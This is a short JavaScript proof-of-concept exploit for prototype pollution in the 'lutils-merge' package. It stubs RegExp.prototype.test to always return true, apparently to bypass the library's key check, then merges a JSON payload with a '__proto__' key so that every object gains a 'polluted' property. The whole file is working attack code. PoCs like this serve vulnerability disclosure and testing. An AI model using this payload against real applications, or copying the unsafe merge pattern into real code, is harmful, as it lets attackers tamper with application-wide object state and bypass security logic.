RegExp.prototype.test = () => true;
const merge = require('lutils-merge');
const payload = '{"__proto__":{"polluted":"yes"}}';
obj = {};
console.log({}.polluted);
merge({}, JSON.parse(payload));
console.log({}.polluted);